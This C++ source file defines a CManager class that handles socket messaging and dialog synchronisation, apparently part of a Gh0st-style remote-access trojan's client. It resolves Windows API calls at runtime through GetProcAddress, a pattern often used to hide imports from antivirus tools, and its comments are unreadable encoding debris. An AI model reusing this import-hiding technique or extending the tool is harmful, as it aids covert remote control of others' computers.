// Manager.cpp: implementation of the CManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include "Manager.h"
#include "until.h"

//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

CManager::CManager(CClientSocket *pClient)
{
	m_pClient = pClient;
	m_pClient->SetManagerCallBack(this);
	
	// �ڶ�������Ϊtrue,��ֹϵͳ�Զ������¼�
	CreateEventAT pCreateEventA=(CreateEventAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateEventA");
	m_hEventDlgOpen = pCreateEventA(NULL, true, false, NULL);
}

CManager::~CManager()
{
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CloseHandle");
	pCloseHandle(m_hEventDlgOpen);
}

void CManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	
}

BOOL CManager::IsConnect()
{
	try
	{
		return m_pClient->IsRunning();
	}
	catch(...)
	{
		return FALSE;
	}
}

void CManager::Disconnect()
{
	try
	{
		m_pClient->Disconnect();
	}
	catch(...){}
}

int CManager::Send(LPBYTE lpData, UINT nSize)
{
	int	nRet = 0;
	try
	{
		nRet = m_pClient->Send((LPBYTE)lpData, nSize);
	}
	catch(...){}
	return nRet;
}

void CManager::WaitForDialogOpen()
{
	WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WaitForSingleObject");
	pWaitForSingleObject(m_hEventDlgOpen, INFINITE);
	// �����Sleep,��ΪԶ�̴��ڴ�InitDialog�з���COMMAND_NEXT����ʾ��Ҫһ��ʱ��
	Sleep(150);
}

void CManager::NotifyDialogIsOpen()
{
	SetEvent(m_hEventDlgOpen);
}

PBYTE CManager::GetBuffer(UINT nPos)
{	
	try
	{
		return m_pClient->m_DeCompressionBuffer.GetBuffer(nPos);
	}
	catch(...)
	{
		return NULL;
	}
}
